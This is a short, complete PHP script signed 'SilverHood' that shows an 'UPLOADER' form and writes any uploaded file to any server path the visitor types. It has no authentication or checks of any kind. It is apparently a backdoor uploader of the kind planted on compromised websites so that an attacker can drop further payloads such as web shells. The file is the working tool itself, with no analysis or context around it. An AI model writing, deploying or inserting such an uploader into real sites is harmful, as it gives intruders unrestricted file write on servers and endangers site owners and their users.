<? echo '<title>UPLOADER</title><body bgcolor=silver><br><center><form method="post" enctype="multipart/form-data" name="uploader" id="uploader"><input name="uploadto" type="text" size="30" value="'.getcwd().'"><br><input type="file" name="file" size="20"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
 if(@copy($_FILES['file']['tmp_name'], $_POST['uploadto'].'/'.$_FILES['file']['name'])) {
 echo '<center>Success!<br>'.$_POST['uploadto']."/".$_FILES['file']['name'];
} else {
echo '<center>Failed!<br>'; }
} echo "<br><br><br><b><i>SilverHood</i></b><br>";?>
